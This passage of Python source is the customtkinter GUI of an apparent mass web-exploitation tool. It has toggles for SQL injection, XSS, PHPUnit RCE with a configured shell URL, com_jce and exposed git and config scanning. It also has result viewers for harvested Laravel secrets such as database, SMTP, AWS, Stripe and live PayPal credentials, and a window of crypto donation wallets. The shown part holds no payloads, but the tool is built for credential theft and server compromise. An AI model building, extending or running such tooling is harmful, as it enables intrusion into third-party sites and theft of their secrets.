            self.tout_txt.place(relx=0.47, rely=1.5, anchor=customtkinter.CENTER)

            self.progress_bar.place(relx=0.3, rely=0.95)
            self.percentage_complete.place(relx=0.62, rely=0.935)
            self.eta_label.place(relx=0.19, rely=0.935)
        
        except Exception as err:
            console.print_exception(show_locals=True)
            consolelog("WARNING", err)

    def on_closing(self):
        global gstop
        global revip_gstop
        global subf_gstop

        # get yes/no answers
        msg = CTkMessagebox(title="Exit?", message="Do you want to close the program?",
                            icon="question", option_1="Cancel", option_2="No", option_3="Yes")
        response = msg.get()
        
        if response=="Yes":
            gstop = 'true'
            revip_gstop = "true"
            subf_gstop = "true"

            try:
                self.destroy()
            except:
                pass

            
                exit()

    def showIntro(self):

        self.resview = customtkinter.CTkTabview(self.ResultFrame)
        self.resview.grid(row=0, column=0, sticky="nsew")
        # self.resview.grid_columnconfigure(0, weight=1)
        # self.resview.grid_rowconfigure(0, weight=1)

        self.resview.add("Setup your Settings").rowconfigure(0, weight=1)
        
    def getjson_data(self, xdata):
        try:
            with open('core/exploits/db.json', 'r', encoding='utf-8') as included_imports:
                db = json.load(included_imports)
                xdata = (db[xdata])
        except Exception as e:
            console.print_exception(show_locals=True)
            return self.self.show_error('Error!', e)
    
        return xdata

    def settings_win(self):

        def SaveGeneral():
              
            try:
                with open('core/settings.json', 'r', encoding='utf-8') as DB:
                    GeneralDB = json.load(DB)

                GeneralDB['protocol'] = self.protocol_entry.get()
                GeneralDB['theme'] = self.DefTheme.get()
                GeneralDB['notifications'] = self.DefNotif.get()
                GeneralDB['sound'] = self.DefSound.get()

                with open("core/settings.json", "w", encoding='utf-8') as saveDB:
                    json.dump(GeneralDB, saveDB)
                  
                self.show_checkmark('Success', 'Saved Successfully')
                consolelog('INFO', "[settings] Saved Successfully")

            except Exception as err:
                console.print_exception(show_locals=True)
                consolelog('ERROR', err)
                return self.show_error('Error', err)

        #return show_info('Soon', 'under construction...')
        self.settings_app = customtkinter.CTkToplevel()  # create CTk window like you do with the Tk window
        self.settings_app.title('Settings')
        self.settings_app.iconbitmap('core/logo.ico')
        ico = Image.open('core/logo.png')
        mainico = ImageTk.PhotoImage(ico)
        self.settings_app.wm_iconphoto(False, mainico)
        self.settings_app.geometry("250x200")
        self.settings_app.minsize(250, 200)
        self.settings_app.attributes("-topmost", True)

        self.settings_app.grid_columnconfigure(1, weight=1)
        self.settings_app.grid_rowconfigure(0, weight=1)
        
        self.settingsSideBar = customtkinter.CTkFrame(self.settings_app, width=159, fg_color="transparent")
        self.settingsSideBar.grid(row=0, column=0)
        self.settingsSideBar.grid_columnconfigure(0, weight=1)
        self.settingsSideBar.grid_rowconfigure((0,1,2,3), weight=1)

        self.generalBtn = customtkinter.CTkButton(master=self.settingsSideBar, state="disabled", text="General", command=self.switchToGeneral, fg_color="red", text_color="black", corner_radius=0)
        self.generalBtn.grid(row=0, column=0, sticky="nsew")
        self.ExploitsBtn = customtkinter.CTkButton(master=self.settingsSideBar, text="Exploits", command=self.switchToExp, fg_color="red", text_color="black", corner_radius=0)
        self.ExploitsBtn.grid(row=1, column=0, sticky="nsew")
        self.WordlistsBtn = customtkinter.CTkButton(master=self.settingsSideBar, text="Wordlists", command=self.switchToWordlist, fg_color="red", text_color="black", corner_radius=0)
        self.WordlistsBtn.grid(row=2, column=0, sticky="nsew")
        self.phprceBtn = customtkinter.CTkButton(master=self.settingsSideBar, text="PHPUnitRCE", command=self.switchToPhpu, fg_color="red", text_color="black", corner_radius=0)
        self.phprceBtn.grid(row=3, column=0, sticky="nsew")

        try:
            with open('core/settings.json', 'r', encoding='utf-8') as GeneralDB:
                settingsGeneralDB = json.load(GeneralDB)
                UserProtocol = (settingsGeneralDB['protocol'])
                UserTheme = (settingsGeneralDB['theme'])
                UserNotification = (settingsGeneralDB['notifications'])
                UserSound = (settingsGeneralDB['sound'])
        except Exception as err:
            console.print_exception(show_locals=True)
            consolelog('ERROR', err)
            return self.show_error('Error!', err)

        self.settingsContainer = customtkinter.CTkFrame(self.settings_app, fg_color="transparent")
        self.settingsContainer.grid(row=0, column=1, sticky="nsew")
        self.settingsContainer.grid_columnconfigure(0, weight=1)
        self.settingsContainer.grid_rowconfigure(0, weight=1)

        self.general_frame = customtkinter.CTkScrollableFrame(self.settingsContainer, label_text="")
        self.general_frame.grid(row=0, column=0, sticky="nsew")
        self.general_frame.grid_columnconfigure(0, weight=1)
        self.general_frame.grid_rowconfigure((0,1,2,3,4), weight=1)

        self.general_protocol = customtkinter.CTkLabel(self.general_frame, text="Protocol", fg_color="transparent")
        self.general_protocol.grid(row=0, column=0, padx=0, pady=(1, 1))

        prot = customtkinter.StringVar(value=UserProtocol)
        self.protocol_entry = customtkinter.CTkEntry(self.general_frame, width=300, textvariable=prot, height=30)
        self.protocol_entry.grid(row=1, column=0, padx=0, pady=(1, 1))

        self.general_theme = customtkinter.CTkLabel(self.general_frame, text="Default Theme", fg_color="transparent")
        self.general_theme.grid(row=2, column=0, padx=0, pady=(1, 1))

        self.DefTheme = customtkinter.CTkOptionMenu(self.general_frame, values=["Light", "Dark", "System"], button_color="red", fg_color="red", text_color="black", button_hover_color="green", command=self.change_appearance_mode_event)
        self.DefTheme.grid(row=3, column=0, padx=0, pady=(1, 1))
        self.DefTheme.set(UserTheme)

        self.gnotification = customtkinter.CTkLabel(self.general_frame, text="Notifications", fg_color="transparent")
        self.gnotification.grid(row=4, column=0, padx=0, pady=(1, 1))

        self.DefNotif = customtkinter.CTkOptionMenu(self.general_frame, values=["on", "off"], button_color="red", fg_color="red", text_color="black", button_hover_color="green",)
        self.DefNotif.grid(row=5, column=0, padx=0, pady=(1, 1))
        self.DefNotif.set(UserNotification)

        self.gSound = customtkinter.CTkLabel(self.general_frame, text="Sound", fg_color="transparent")
        self.gSound.grid(row=6, column=0, padx=0, pady=(1, 1))

        self.DefSound = customtkinter.CTkOptionMenu(self.general_frame, values=["on", "off"], button_color="red", fg_color="red", text_color="black", button_hover_color="green",)
        self.DefSound.grid(row=7, column=0, padx=0, pady=(1, 1))
        self.DefSound.set(UserSound)

        deftheme_var = customtkinter.StringVar(value=UserTheme)
        self.appearance_mode_optionemenu.configure(variable=deftheme_var)

        self.general_save = customtkinter.CTkButton(master=self.general_frame, command=SaveGeneral, text="Save", fg_color="red", text_color="black")
        self.general_save.grid(row=8, column=0, padx=0, pady=(5, 5))

    def Savephpu(self):
        try:
            with open('core/phpunitrce.json', 'r', encoding='utf-8') as cxf:
                cxfdb = json.load(cxf)
              
        except Exception as err:
            console.print_exception(show_locals=True)
            consolelog('ERROR', err)

        try:
            cxfdb['ShellUrl'] = self.phpu_entry.get()
            cxfdb['ShellKeyCheck'] = self.phpu_kentry.get()

            with open("core/phpunitrce.json", "w", encoding='utf-8') as phpu:
                json.dump(cxfdb, phpu)

            self.show_checkmark('Success', 'Saved Successfully')

        except Exception as err:
            console.print_exception(show_locals=True)
            consolelog('ERROR', err)

            self.show_error('Error', err)

    def SaveBk(self):
        try:
            try:
                bklist = self.bk_textbox.get("0.0", "end")
                with open('core/txt/Blacklist.txt', "w", encoding='utf-8') as f:
                    f.write(bklist)
            except:
                pass

            try:
                keyslist = self.keys_textbox.get("0.0", "end")
                with open('core/txt/apikeys.txt', "w", encoding='utf-8') as keysList:
                    keysList.write(keyslist)
            except:
                pass

            try:
                Sqllist = self.sqllist_textbox.get("0.0", "end")
                with open('core/txt/SQL.txt', "w", encoding='utf-8') as f:
                    f.write(Sqllist)
            except:
                pass

            try:
                OpenRlist = self.op_textbox.get("0.0", "end")
                with open('core/txt/OpenRedirect.txt', "w", encoding='utf-8') as f:
                    f.write(OpenRlist)
            except:
              pass

            self.show_checkmark('Success', 'Saved Successfully.')
            self.auto_function()

        except Exception as err:
            console.print_exception(show_locals=True)
            consolelog('ERROR', err)
            return self.show_error('Error!', err)

    def allgetsql_var(self):
        allsqlvar = self.allsql_switch_var.get()
        
        try:
            with open('core/exploits/db.json', 'r', encoding='utf-8') as settings_data:
                SqlDb = json.load(settings_data)
                SqlDb['sql'] = allsqlvar
       
            with open("core/exploits/db.json", "w", encoding='utf-8') as upDb:
                json.dump(SqlDb, upDb)

        except Exception as err:
            console.print_exception(show_locals=True)
            return self.show_error('Error!', err)


        if allsqlvar == 'on':
            try:
                self.resview.delete("Setup your Settings")
            except:
                pass

            self.resview.add("SQL").grid_columnconfigure(0, weight=1)
            self.sqlres_frame = customtkinter.CTkScrollableFrame(self.resview.tab("SQL"))
            self.sqlres_frame.grid(row=0, column=0, sticky="nsew")
            self.sqlres_frame.grid_columnconfigure(0, weight=1)
            self.sqlres_frame.grid_rowconfigure(0, weight=1)

            self.sqlbox = customtkinter.CTkLabel(self.resscrollable_frame, text=f'SQL: {sqlres}', fg_color="transparent")
            self.sqlbox.grid(row=0, column=0, sticky="nsew")

            self.wpsql_switch_var.set("on")
            self.joosql_switch_var.set("on")
            self.pressql_switch_var.set("on")
            self.drupsql_switch_var.set("on")
            self.oscsql_switch_var.set("on")
            self.vbsql_switch_var.set("on")
            self.othersql_switch_var.set("on")

        if allsqlvar == 'off':
            try:
                self.resview.delete("SQL")
                self.sqlres_frame.destroy()
                self.sqlbox.destroy()        
            except:
                pass
            
            sql_value = self.getjson_data('sql')
            xss_value = self.getjson_data('xss')
            phpu_value = self.getjson_data('phpunitrce')
            cors_value = self.getjson_data('cors')
            cfg_value = self.getjson_data('config')
            ap_value = self.getjson_data('apikeys')
            git_value = self.getjson_data('git')
            comJce_value = self.getjson_data('com_jce')

            gvalues = [sql_value, xss_value, phpu_value, cors_value, cfg_value, ap_value, git_value, comJce_value]
            active_found = False
            for xv in gvalues:
                if xv == "on":
                    active_found = True
                    break
            
            if active_found == False:
                self.showIntro()
                
            self.wpsql_switch_var.set("off")
            self.joosql_switch_var.set("off")
            self.pressql_switch_var.set("off")
            self.drupsql_switch_var.set("off")
            self.oscsql_switch_var.set("off")
            self.vbsql_switch_var.set("off")
            self.othersql_switch_var.set("off")

    def allgetxss_var(self):
        global xssres
        allxssvar = self.allxss_switch_var.get()

        try:
            with open('core/exploits/db.json', 'r', encoding='utf-8') as settings_data:
                XssDb = json.load(settings_data)
                XssDb['xss'] = allxssvar
       
            with open("core/exploits/db.json", "w", encoding='utf-8') as upDb:
                json.dump(XssDb, upDb)

        except Exception as err:
            console.print_exception(show_locals=True)
            return self.show_error('Error!', err)

        if allxssvar == 'on':
            try:
                self.resview.delete("Setup your Settings")
            except:
                pass

            self.resview.add("XSS").grid_columnconfigure(0, weight=1)

            self.xssres_frame = customtkinter.CTkScrollableFrame(self.resview.tab("XSS"))
            self.xssres_frame.grid(row=0, column=0, sticky="nsew")
            self.xssres_frame.grid_columnconfigure(0, weight=1)
            self.xssres_frame.grid_rowconfigure(0, weight=1)
 
            self.xssbox = customtkinter.CTkLabel(self.resscrollable_frame, text=f'XSS: {xssres}', fg_color="transparent")
            self.xssbox.grid(row=1, column=0)

            self.wpxss_switch_var.set("on")
            self.jooxss_switch_var.set("on")
            self.presxss_switch_var.set("on")
            self.drupxss_switch_var.set("on")
            self.oscxss_switch_var.set("on")
            self.vbxss_switch_var.set("on")
            self.otherxss_switch_var.set("on")

        if allxssvar == 'off':
            try:
                self.resview.delete("XSS")
                self.xssres_frame.destroy()
                self.xssbox.destroy()
            except:
                pass

            sql_value = self.getjson_data('sql')
            xss_value = self.getjson_data('xss')
            phpu_value = self.getjson_data('phpunitrce')
            cors_value = self.getjson_data('cors')
            cfg_value = self.getjson_data('config')
            ap_value = self.getjson_data('apikeys')
            git_value = self.getjson_data('git')
            comJce_value = self.getjson_data('com_jce')

            gvalues = [sql_value, xss_value, phpu_value, cors_value, cfg_value, ap_value, git_value, comJce_value]
            active_found = False
            for xv in gvalues:
                if xv == "on":
                    active_found = True
                    break
            
            if active_found == False:
                self.showIntro()
                    
            self.wpxss_switch_var.set("off")
            self.jooxss_switch_var.set("off")
            self.presxss_switch_var.set("off")
            self.drupxss_switch_var.set("off")
            self.oscxss_switch_var.set("off")
            self.vbxss_switch_var.set("off")
            self.otherxss_switch_var.set("off")

    def allgetgit_var(self):
        global gitres

        allgitvar = self.allgit_switch_var.get()

        try:
            with open('core/exploits/db.json', 'r', encoding='utf-8') as settings_data:
                gitDb = json.load(settings_data)
                gitDb['git'] = allgitvar
       
            with open("core/exploits/db.json", "w", encoding='utf-8') as upDb:
                json.dump(gitDb, upDb)

        except Exception as err:
            console.print_exception(show_locals=True)
            return self.show_error('Error!', err)

        if allgitvar == 'on':
            try:
                self.resview.delete("Setup your Settings")
            except:
                pass

            self.resview.add("GIT").grid_columnconfigure(0, weight=1)
            self.git_frame = customtkinter.CTkScrollableFrame(self.resview.tab("GIT"))
            self.git_frame.grid(row=0, column=0, sticky="nsew")
            self.git_frame.grid_columnconfigure(0, weight=1)
            self.git_frame.grid_rowconfigure(0, weight=1)
            
            self.wpgit_switch_var.set("on")
            self.othergit_switch_var.set("on")

            self.gitbox = customtkinter.CTkLabel(self.resscrollable_frame, text=f'GIT: {gitres}', fg_color="transparent")
            self.gitbox.grid(row=4, column=0)
        
        if allgitvar == 'off':
            try:
                self.resview.delete("GIT")
                self.git_frame.destroy()
                self.gitbox.destroy()
            except:
                pass

            sql_value = self.getjson_data('sql')
            xss_value = self.getjson_data('xss')
            phpu_value = self.getjson_data('phpunitrce')
            cors_value = self.getjson_data('cors')
            cfg_value = self.getjson_data('config')
            ap_value = self.getjson_data('apikeys')
            git_value = self.getjson_data('git')
            comJce_value = self.getjson_data('com_jce')

            gvalues = [sql_value, xss_value, phpu_value, cors_value, cfg_value, ap_value, git_value, comJce_value]
            active_found = False
            for xv in gvalues:
                if xv == "on":
                    active_found = True
                    break
            
            if active_found == False:
                self.showIntro()
            
            self.wpgit_switch_var.set("off")
            self.othergit_switch_var.set("off")

    def cors_var(self):
        global cors_res

        allcorsvar = self.allcors_switch_var.get()
        
        try:
            with open('core/exploits/db.json', 'r', encoding='utf-8') as settings_data:
                CorsDb = json.load(settings_data)
                CorsDb['cors'] = allcorsvar
       
            with open("core/exploits/db.json", "w", encoding='utf-8') as upDb:
                json.dump(CorsDb, upDb)

        except Exception as err:
            console.print_exception(show_locals=True)
            return self.show_error('Error!', err)

        
        if allcorsvar == "on":
            try:
                self.resview.delete("Setup your Settings")
            except:
                pass

            self.resview.add("CORS").grid_columnconfigure(0, weight=1)
            self.corsres_frame = customtkinter.CTkScrollableFrame(self.resview.tab("CORS"))
            self.corsres_frame.grid(row=0, column=0, sticky="nsew")
            self.corsres_frame.grid_columnconfigure(0, weight=1)
            self.corsres_frame.grid_rowconfigure(0, weight=1)            

            self.corsbox = customtkinter.CTkLabel(self.resscrollable_frame, text=f'CORS: {cors_res}', fg_color="transparent")
            self.corsbox.grid(row=2, column=0)
                                
        elif allcorsvar == "off":
            try:
                self.resview.delete("CORS")
                self.corsres_frame.destroy()
                self.corsbox.destroy()
            except:
                pass

            sql_value = self.getjson_data('sql')
            xss_value = self.getjson_data('xss')
            phpu_value = self.getjson_data('phpunitrce')
            cors_value = self.getjson_data('cors')
            cfg_value = self.getjson_data('config')
            ap_value = self.getjson_data('apikeys')
            git_value = self.getjson_data('git')
            comJce_value = self.getjson_data('com_jce')

            gvalues = [sql_value, xss_value, phpu_value, cors_value, cfg_value, ap_value, git_value, comJce_value]
            active_found = False
            for xv in gvalues:
                if xv == "on":
                    active_found = True
                    break
            
            if active_found == False:
                self.showIntro()
            
    def allgetcfg_var(self):
        global envres

        allcfgvar = self.allcfg_switch_var.get()

        try:
            with open('core/exploits/db.json', 'r', encoding='utf-8') as settings_data:
                cfgDb = json.load(settings_data)
                cfgDb['config'] = allcfgvar
       
            with open("core/exploits/db.json", "w", encoding='utf-8') as upDb:
                json.dump(cfgDb, upDb)

        except Exception as err:
            console.print_exception(show_locals=True)
            return self.show_error('Error!', err)


        if allcfgvar == 'on':
            try:
                self.resview.delete("Setup your Settings")
            except:
                pass

            self.resview.add("Config").grid_columnconfigure(0, weight=1)
            self.envres_frame = customtkinter.CTkScrollableFrame(self.resview.tab("Config"), fg_color="transparent")
            self.envres_frame.grid(row=0, column=0, sticky="nsew")
            self.envres_frame.grid_columnconfigure(0, weight=1)
            self.envres_frame.grid_rowconfigure(0, weight=1)

            self.cfgbox = customtkinter.CTkLabel(self.resscrollable_frame, text=f'Config: {envres}', fg_color="transparent")
            self.cfgbox.grid(row=3, column=0, sticky="nsew")
             
            self.lrvlenv_switch_var.set("on")
        
        if allcfgvar == 'off':
            try:
                self.resview.delete("Config")
                self.envres_frame.destroy()
                self.cfgbox.destroy()
            except:
                pass

            sql_value = self.getjson_data('sql')
            xss_value = self.getjson_data('xss')
            phpu_value = self.getjson_data('phpunitrce')
            cors_value = self.getjson_data('cors')
            cfg_value = self.getjson_data('config')
            ap_value = self.getjson_data('apikeys')
            git_value = self.getjson_data('git')
            comJce_value = self.getjson_data('com_jce')

            gvalues = [sql_value, xss_value, phpu_value, cors_value, cfg_value, ap_value, git_value, comJce_value]
            active_found = False
            for xv in gvalues:
                if xv == "on":
                    active_found = True
                    break
            
            if active_found == False:
                self.showIntro()

            
            self.lrvlenv_switch_var.set("off")

    def allgetphpu_var(self):
        global PhpUnitRCE

        allphpuvar = self.allphpu_switch_var.get()

        try:
            with open('core/exploits/db.json', 'r', encoding='utf-8') as settings_data:
                phpuDb = json.load(settings_data)
                phpuDb['phpunitrce'] = allphpuvar
       
            with open("core/exploits/db.json", "w", encoding='utf-8') as upDb:
                json.dump(phpuDb, upDb)

        except Exception as err:
            console.print_exception(show_locals=True)
            return self.show_error('Error!', err)

        if allphpuvar == 'on':
            try:
                self.resview.delete("Setup your Settings")
            except:
                pass
                
            self.resview.add("PHPUnitRCE").grid_columnconfigure(0, weight=1)
            self.lrvrceres_frame = customtkinter.CTkScrollableFrame(self.resview.tab("PHPUnitRCE"))
            self.lrvrceres_frame.grid(row=0, column=0, sticky="nsew")
            self.lrvrceres_frame.grid_columnconfigure(0, weight=1)
            self.lrvrceres_frame.grid_rowconfigure(0, weight=1)
            
            self.lrvlpur_switch_var.set("on")
         
            self.phpubox = customtkinter.CTkLabel(self.resscrollable_frame, text=f'PHPUnitRCE: {PhpUnitRCE}', fg_color="transparent")
            self.phpubox.grid(row=5, column=0)
    
        if allphpuvar == 'off':
            try:
                self.resview.delete("PHPUnitRCE")
                self.lrvrceres_frame.destroy()
                self.phpubox.destroy()
            except:
                pass

            sql_value = self.getjson_data('sql')
            xss_value = self.getjson_data('xss')
            phpu_value = self.getjson_data('phpunitrce')
            cors_value = self.getjson_data('cors')
            cfg_value = self.getjson_data('config')
            ap_value = self.getjson_data('apikeys')
            git_value = self.getjson_data('git')
            comJce_value = self.getjson_data('com_jce')

            gvalues = [sql_value, xss_value, phpu_value, cors_value, cfg_value, ap_value, git_value, comJce_value]
            active_found = False
            for xv in gvalues:
                if xv == "on":
                    active_found = True
                    break
            
            if active_found == False:
                self.showIntro()
            
            self.lrvlpur_switch_var.set("off")
        
    def allgetconJce_var(self):
        global comJceres

        allComJcevar = self.allcomJce_switch_var.get()

        try:
            with open('core/exploits/db.json', 'r', encoding='utf-8') as settings_data:
                ComJceDb = json.load(settings_data)
                ComJceDb['com_jce'] = allComJcevar
       
            with open("core/exploits/db.json", "w", encoding='utf-8') as upDb:
                json.dump(ComJceDb, upDb)

        except Exception as err:
            console.print_exception(show_locals=True)
            return self.show_error('Error!', err)

        if allComJcevar == 'on':
            try:
                self.resview.delete("Setup your Settings")
            except:
                pass
                
            self.resview.add("com_jce").grid_columnconfigure(0, weight=1)
            self.com_jceres_frame = customtkinter.CTkScrollableFrame(self.resview.tab("com_jce"))
            self.com_jceres_frame.grid(row=0, column=0, sticky="nsew")
            self.com_jceres_frame.grid_columnconfigure(0, weight=1)
            self.com_jceres_frame.grid_rowconfigure(0, weight=1)
            
            self.joocom_jce_switch_var.set("on")
         
            self.com_jcebox = customtkinter.CTkLabel(self.resscrollable_frame, text=f'com_jce: {comJceres}', fg_color="transparent")
            self.com_jcebox.grid(row=6, column=0)

        if allComJcevar == 'off':
            try:
                self.resview.delete("com_jce")
                self.com_jceres_frame.destroy()
                self.com_jcebox.destroy()
            except:
                pass

            sql_value = self.getjson_data('sql')
            xss_value = self.getjson_data('xss')
            phpu_value = self.getjson_data('phpunitrce')
            cors_value = self.getjson_data('cors')
            cfg_value = self.getjson_data('config')
            ap_value = self.getjson_data('apikeys')
            git_value = self.getjson_data('git')
            comJce_value = self.getjson_data('com_jce')

            gvalues = [sql_value, xss_value, phpu_value, cors_value, cfg_value, ap_value, git_value, comJce_value]
            active_found = False
            for xv in gvalues:
                if xv == "on":
                    active_found = True
                    break
            
            if active_found == False:
                self.showIntro()
            
            self.joocom_jce_switch_var.set("off")

    def apikeys_var(self):
        apikeysvar = self.apikeys_switch_var.get()

        try:
            with open('core/exploits/db.json', 'r', encoding='utf-8') as settings_data:
                keysDb = json.load(settings_data)
                keysDb['apikeys'] = apikeysvar
       
            with open("core/exploits/db.json", "w", encoding='utf-8') as upDb:
                json.dump(keysDb, upDb)

        except Exception as err:
            console.print_exception(show_locals=True)
            return self.show_error('Error!', err)

    def getDBList(self):
        tx10 = threading.Thread(target=self.GetResult, args=('Result/Laravel/DBs.txt',))
        tx10.daemon = True
        tx10.start()

    def getSmtpList(self):
        tx11 = threading.Thread(target=self.GetResult, args=('Result/Laravel/smtp.txt',))
        tx11.daemon = True
        tx11.start()

    def getTwilioList(self):
        tx12 = threading.Thread(target=self.GetResult, args=('Result/Laravel/twilio.txt',))
        tx12.daemon = True
        tx12.start()

    def getSmsList(self):
        threading.Thread(target=self.GetResult, args=('Result/Laravel/sms.txt',)).start()

    def getAwsList(self):
        threading.Thread(target=self.GetResult, args=('Result/Laravel/aws.txt',)).start()

    def getStripeList(self):
        threading.Thread(target=self.GetResult, args=('Result/Laravel/stripe.txt',)).start()

    def getCsList(self):
        threading.Thread(target=self.GetResult, args=('Result/Laravel/clicksend.txt',)).start()

    def getOsList(self):
        iux = threading.Thread(target=self.GetResult, args=('Result/Laravel/onesignal.txt',))
        iux.daemon = True
        iux.start()

    def getRazorPayList(self):
        txi = threading.Thread(target=self.GetResult, args=('Result/Laravel/razorpay.txt',))
        txi.daemon = True
        txi.start()

    def getPaypalLiveList(self):
        txe = threading.Thread(target=self.GetResult, args=('Result/Laravel/paypal_live.txt',))
        txe.daemon = True
        txe.start()

    def getPaypalSList(self):
        txr = threading.Thread(target=self.GetResult, args=('Result/Laravel/paypal_sandbox.txt',))
        txr.daemon = True
        txr.start()

    def pOenR_var(self):
        pOenRvar = self.pOenR_switch_var.get()

        try:
            with open('core/exploits/db.json', 'r', encoding='utf-8') as settings_data:
                pOenRDb = json.load(settings_data)
                pOenRDb['OpenRedirect'] = pOenRvar
       
            with open("core/exploits/db.json", "w", encoding='utf-8') as upDb:
                json.dump(pOenRDb, upDb)

        except Exception as err:
            console.print_exception(show_locals=True)
            return self.show_error('Error!', err)

    def show_value(self, value):
        global threadingvalue

        threadingvalue = int(value)

        # if threadingvalue > 6:
        #     self.show_info('Important!', 'More than 5 bots are unsafe, maybe we will fix that in the next version')
        #     threadingvalue = 5

        
        valtxt = f'Threads: {threadingvalue}'
        self.thraeds_txt.configure(text=valtxt)

        self.settings_db('post', 'threads', threadingvalue)
        self.range_slider.set(threadingvalue)

    def GPTj_trigger(self):
        try:
            tx = threading.Thread(target=GPTj)
            tx.daemon = True
            tx.start()
        except Exception as err:
            console.print_exception(show_locals=True)
            return self.show_error('Error!', err)

    def show_tvalue(self, value):
        global gtimeout

        gtimeout = int(value)
        timevar = f'Timeout: {gtimeout}'
        self.tout_txt.configure(text=timevar)

        self.settings_db('post', 'timeout', gtimeout)

    def open_rfolder(self):
        directory = os.getcwd()
        res_folder = f'{directory}/Result'
        os.startfile(res_folder)

    def donate_win(self):
        self.donate = customtkinter.CTkToplevel()
        self.donate.title("Donate - BTC")
        self.donate.iconbitmap('core/logo.ico')
        ico = Image.open('core/logo.png')
        mainico = ImageTk.PhotoImage(ico)
        self.donate.wm_iconphoto(False, mainico) 
        self.donate.geometry("500x150")
        self.donate.attributes("-topmost", True)  # stay on top
        self.donate.resizable(False, False)

        self.donate.grid_columnconfigure((0,1,2,3,4,5), weight=1)
        self.donate.grid_rowconfigure(2, weight=1)            
        
        self.frame_info = customtkinter.CTkFrame(master=self.donate, height=80, fg_color="transparent")
        self.frame_info.grid(row=0, column=0, columnspan=6, sticky="nsew", padx=20, pady=20)
        self.frame_info.grid_columnconfigure(0, weight=1)

        self.widget_type = customtkinter.CTkLabel(master=self.frame_info, image=btc_icon, text="", fg_color="transparent", corner_radius=5, width=200, height=20)
        self.widget_type.grid(row=0, column=0, sticky="nswe", padx=80, pady=20)

        self.left_button = customtkinter.CTkButton(master=self.frame_info, text="<", width=20, height=20, corner_radius=5, command=self.change_coin)
        self.left_button.grid(row=0, column=0, sticky="nsw", padx=20, pady=20)

        self.right_button = customtkinter.CTkButton(master=self.frame_info, text=">", width=20, height=20, corner_radius=5, command=self.change_coin)
        self.right_button.grid(row=0, column=0, sticky="nse", padx=20, pady=20)

        self.walletbox = customtkinter.CTkTextbox(self.donate, width=300, height=30)
        self.walletbox.place(relx=0.5, rely=0.7, anchor=customtkinter.CENTER)
        self.walletbox.delete("0.0", "end")
        self.walletbox.insert("0.0", "1Bjxje8AxDRdvGnH4kQunZ1CWtGC8A25oM")

    def change_coin(self):
        global donate_coins

        try:
            dcoin = Xchoice(donate_coins)
            donate_coins.remove(dcoin)
            self.widget_type.configure(image=dcoin)

            if dcoin == btc_icon:
                self.donate.title("Donate - BTC")
                self.walletbox.delete("0.0", "end")
                self.walletbox.insert("0.0", "1Bjxje8AxDRdvGnH4kQunZ1CWtGC8A25oM")
            elif dcoin == eth_icon:
                self.donate.title("Donate - ETH")
                self.walletbox.delete("0.0", "end")
                self.walletbox.insert("0.0", "0xBB21596e90b6BD804B81B6148f36261dA9E4701A")
            elif dcoin == ltc_icon:
                self.donate.title("Donate - LTC")
                self.walletbox.delete("0.0", "end")
                self.walletbox.insert("0.0", "ltc1qf8qlcwseel5a45jq46qpmejacg5l6qfv92fs0x")
            elif dcoin == doge_icon:
                self.donate.title("Donate - DOGE")
                self.walletbox.delete("0.0", "end")
                self.walletbox.insert("0.0", "DCSy6uqqtwTNVW14zEH9QAci6y8AkFiHD8")
            elif dcoin == bch_icon:
                self.donate.title("Donate - BCH")
                self.walletbox.delete("0.0", "end")
                self.walletbox.insert("0.0", "bitcoincash:qpkv2jdw0r8sr72y7a526ljq9x8eqtnsrvp2q7s2q5")
            elif dcoin == dash_icon:
                self.donate.title("Donate - DASH")
                self.walletbox.delete("0.0", "end")
                self.walletbox.insert("0.0", "XpD6C1xVJdmvocKwagVwyi4t97G5bNEuzg")
            elif dcoin == dgb_icon:
                self.donate.title("Donate - DGB")
                self.walletbox.delete("0.0", "end")
                self.walletbox.insert("0.0", "DBvTRHyxSwrbQK8a9orMBdZhKVxUwvNaAn")
            elif dcoin == trx_icon:
                self.donate.title("Donate - TRX")
                self.walletbox.delete("0.0", "end")
                self.walletbox.insert("0.0", "TBVwNaLxuJ853WbTtXPqJkra8hsgwiZm7C")
            elif dcoin == usdt_icon:
                self.donate.title("Donate - USDT")
                self.walletbox.delete("0.0", "end")
                self.walletbox.insert("0.0", "TBVwNaLxuJ853WbTtXPqJkra8hsgwiZm7C")
            elif dcoin == fey_icon:
                self.donate.title("Donate - FEY")
                self.walletbox.delete("0.0", "end")
                self.walletbox.insert("0.0", "0xBB21596e90b6BD804B81B6148f36261dA9E4701A")
            elif dcoin == zec_icon:
                self.donate.title("Donate - ZEC")
                self.walletbox.delete("0.0", "end")
                self.walletbox.insert("0.0", "t1gSAmJiUSemzgASZydftiiSQaDGp4vgeLf")
            elif dcoin == bnb_icon:
                self.donate.title("Donate - BNB")
                self.walletbox.delete("0.0", "end")
                self.walletbox.insert("0.0", "0xD65743bDa6e4cF1C4f09401b80d70552c360868E")
            elif dcoin == sol_icon:
                self.donate.title("Donate - SOL")
                self.walletbox.delete("0.0", "end")
                self.walletbox.insert("0.0", "GnCM8zNAka2DQzin5uqxm9BKuZc44B3ZACF6zm22aBb2")
            elif dcoin == xrp_icon:
                self.donate.title("Donate - XRP")
                self.walletbox.delete("0.0", "end")
                self.walletbox.insert("0.0", "rhi77L73jGvGN3zQf3AEbYnjWYZu7CSTe8")
            elif dcoin == matic_icon:
                self.donate.title("Donate - MATIC")
                self.walletbox.delete("0.0", "end")
                self.walletbox.insert("0.0", "0x7AE71a7688b62C5dAde6D1d751a0b7E795b5565D")
                
        except Exception:
            donate_coins = [btc_icon, eth_icon, ltc_icon, doge_icon, bch_icon, dash_icon, dgb_icon, trx_icon, usdt_icon, fey_icon, zec_icon, bnb_icon, sol_icon, xrp_icon, matic_icon]
            self.change_coin()

    def sctheme(self, todo):
        try:
            do = int(todo)
            ThemeMaker(do)
        except Exception as err:
            console.print_exception(show_locals=True)
            consolelog('ERROR', err)
            return self.show_error('Error! [sctheme]', err)

    def change_theme(self, todo):
        bot = threading.Thread(target=self.sctheme, args=(todo,))
        bot.daemon = True
        bot.start()

    def openlist_trigger(self):
        tni = threading.Thread(target=self.openlist)
        tni.daemon = True
        tni.start()

    def gen_regix(self):
        global regixGnAmount

        #show_info('Soon', 'Under Construction')

        self.genregix__root = customtkinter.CTkToplevel()
        self.genregix__root.title(f'Generate Regex > {regixGnAmount}')
        self.genregix__root.iconbitmap('core/logo.ico')
        ico = Image.open('core/logo.png')
        mainico = ImageTk.PhotoImage(ico)
        self.genregix__root.wm_iconphoto(False, mainico)
        self.genregix__root.geometry('700x300')
        self.genregix__root.attributes("-topmost", True)
        self.genregix__root.resizable(False, False)

        
